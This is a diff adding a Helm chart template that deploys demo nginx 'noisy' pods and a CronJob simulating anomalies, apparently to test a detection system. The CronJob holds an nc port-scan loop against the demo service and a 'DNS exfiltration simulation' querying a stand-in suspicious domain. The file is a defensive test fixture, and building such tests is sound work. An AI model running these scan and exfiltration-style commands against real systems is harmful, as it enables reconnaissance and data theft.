@@ -1,0 +1,99 @@
+{{- if and .Values.global.enabled .Values.demo.enabled -}}
+---
+# Noisy neighbor deployment for baseline traffic
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: {{ include "aswarm.fullname" . }}-noisy
+  namespace: {{ .Values.global.namespace }}
+  labels:
+    {{- include "aswarm.labels" . | nindent 4 }}
+    app.kubernetes.io/component: demo-noisy
+spec:
+  replicas: {{ .Values.demo.noisy.replicas }}
+  selector:
+    matchLabels:
+      app: noisy
+      demo: aswarm
+  template:
+    metadata:
+      labels:
+        app: noisy
+        demo: aswarm
+    spec:
+      containers:
+        - name: noisy
+          image: nginx:alpine
+          resources:
+            requests:
+              cpu: 10m
+              memory: 16Mi
+            limits:
+              cpu: 50m
+              memory: 64Mi
+          livenessProbe:
+            httpGet:
+              path: /
+              port: 80
+            periodSeconds: 60
+---
+# Service for noisy pods
+apiVersion: v1
+kind: Service
+metadata:
+  name: {{ include "aswarm.fullname" . }}-noisy
+  namespace: {{ .Values.global.namespace }}
+  labels:
+    {{- include "aswarm.labels" . | nindent 4 }}
+    app.kubernetes.io/component: demo-noisy
+spec:
+  selector:
+    app: noisy
+  ports:
+    - port: 80
+      targetPort: 80
+---
+# Anomaly test CronJob
+{{- if .Values.demo.anomaly.enabled }}
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: {{ include "aswarm.fullname" . }}-anomaly-test
+  namespace: {{ .Values.global.namespace }}
+  labels:
+    {{- include "aswarm.labels" . | nindent 4 }}
+    app.kubernetes.io/component: demo-anomaly
+spec:
+  schedule: {{ .Values.demo.anomaly.schedule | quote }}
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+            app: anomaly
+            sidecar.istio.io/inject: "false"
+        spec:
+          restartPolicy: OnFailure
+          containers:
+            - name: anomaly
+              image: nicolaka/netshoot:latest
+              command:
+                - /bin/bash
+                - -c
+                - |
+                  echo "Starting anomaly simulation..."
+                  # Port scan simulation
+                  for port in 22 80 443 3306 5432 6379 8080 9200; do
+                    timeout 0.1 nc -zv {{ include "aswarm.fullname" . }}-noisy $port || true
+                  done
+                  # DNS exfiltration simulation
+                  for i in {1..10}; do
+                    nslookup data$i.suspicious-domain.com || true
+                  done
+                  echo "Anomaly simulation complete"
+              resources:
+                limits:
+                  cpu: 100m
+                  memory: 128Mi
+{{- end }}
+{{- end -}}
